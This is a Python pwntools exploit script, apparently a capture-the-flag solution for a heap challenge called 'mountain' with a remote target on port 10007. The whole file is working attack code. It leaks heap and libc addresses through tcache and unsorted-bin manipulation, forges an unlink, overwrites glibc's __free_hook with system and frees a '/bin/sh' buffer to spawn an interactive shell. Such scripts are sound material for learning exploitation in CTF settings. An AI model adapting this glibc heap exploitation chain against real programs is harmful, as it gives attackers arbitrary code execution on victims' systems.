import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./mountain')
			# io=process(['./mountain'],env={'LD_PRELOAD':'./libc-2.29.so'})
			elf=ELF('./mountain')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			#ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('nc.eonew.cn',10007)
			elf=ELF('./mountain')
			libc=ELF('./libc-2.29.so')
			#ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def add(a,b):
			io.sendlineafter('choice: ','1')
			io.sendlineafter('size: ',str(a))
			io.sendafter('content: ',b)

		def delete():
			io.sendlineafter('choice: ','2')

		def show():
			io.sendlineafter('choice: ','3')

		for i in range(7):
			add(0x38,'a')
			delete()
			add(0x138,'a')
			delete()
			add(0x38,'\x00'*0x38)
			add(0x138,'\x00'*0xf0+p64(0)+p64(0x41))
			delete()

		show()
		io.recvuntil('content: ')
		heap_base=u64(io.recv(6)+'\x00\x00')-0xa20
		# for i in range(7):
		# 	add(0x38,'a')
		# 	delete()
		# 	add(0x1f9,'a')
		# 	delete()
		# 	add(0x38,'\x00'*0x38)
		# 	add(0x1f9,'\x00'*0xf0+p64(0)+p64(0x41))
		# 	delete()
	
		# add(0x58,'\x00'*0x18+p64(0x21)+p64(heap_base+0xd20)+p64(0x91)+p64(0)+p64(0x81)+p64(heap_base+0xd00-0x18)+p64(heap_base+0xd00-0x10))
		add(0x68,'\x00'*0x50)
		delete()
		add(0x138,'a')
		delete()
		add(0x38,'a')
		fake_ptr=heap_base+0xd10
		fd=fake_ptr-0x18
		bk=fake_ptr-0x10
		add(0x68,'\x00'*0x30+p64(heap_base+0xd10)+p64(0x31)+p64(fd)+p64(bk)+p64(0)*2+p64(0x30))
		delete()
		add(0x138,'a'*0xf0+p64(0)+p64(0x41))
		# gdb.attach(io)
		delete()
		add(0x28,'a')
		delete()
		add(0x68,'\x00'*0x38+p64(0x31)+p64(heap_base+0x50))
		add(0x28,p64(0x101))
		add(0x28,p64(heap_base+0x18)+p64(heap_base+0x50))
		add(0x18,'\x18'*8)
		add(0xc0,'a')
		delete()
		show()
		io.recvuntil('content: ')
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		add(0x28,p64(libc.sym['__free_hook']))
		add(0x18,p64(libc.sym['system']))
		add(0x48,'/bin/sh\x00')
		delete()
		



		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue